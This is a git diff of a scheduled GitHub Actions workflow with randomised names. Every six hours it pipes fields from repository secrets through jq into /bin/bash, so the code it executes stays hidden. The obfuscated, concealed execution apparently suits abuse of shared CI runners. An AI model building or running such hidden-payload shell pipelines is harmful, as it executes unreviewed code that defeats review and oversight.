@@ -1,26 +1,30 @@
 name: biohazardapricots
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 0/6 * * *'
-
+    - cron: '35 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: biohazardapricots
         env:
-          a987: ${{ secrets.a987 }}
+          rva5: ${{ secrets.rva5 }}
         run: |
-          echo $a987 | jq -r .kpaj2748 | /bin/bash
-          echo $dvj5 | jq -r .fcbx852 | /bin/bash
-          echo $t912 | jq -r .jmthl3 | /bin/bash
-          echo $v31 | jq -r .l7500 | /bin/bash
-          echo $ymcs522 | jq -r .dz8826 | /bin/bash
-          echo $g00 | jq -r .bxy8788 | /bin/bash
-          echo $jczhb82555 | jq -r .amzfl59796 | /bin/bash
-          echo $fsw4 | jq -r .qb156 | /bin/bash
-          echo $ota7083 | jq -r .dvof92548 | /bin/bash
-          echo $kynn5 | jq -r .wwq9 | /bin/bash
+          echo $rva5 | jq -r .xpnki3 | /bin/bash
+          echo $oklsu801 | jq -r .auxyl547 | /bin/bash
+          echo $aq12 | jq -r .tpww314 | /bin/bash
+          echo $u35 | jq -r .azte84 | /bin/bash
+          echo $r45357 | jq -r .lmg5356 | /bin/bash
+          echo $abs64 | jq -r .eo616 | /bin/bash
+          echo $zrzx91 | jq -r .i8905 | /bin/bash
+          echo $d577 | jq -r .juvkt8 | /bin/bash
+          echo $iti00 | jq -r .nzv3 | /bin/bash
+          echo $ooyjw04646 | jq -r .sjb4 | /bin/bash
+          echo $wroog09706 | jq -r .kcvt6780 | /bin/bash
+          echo $m9 | jq -r .anrkc342 | /bin/bash
+          echo $yw0 | jq -r .hjs4405 | /bin/bash
 
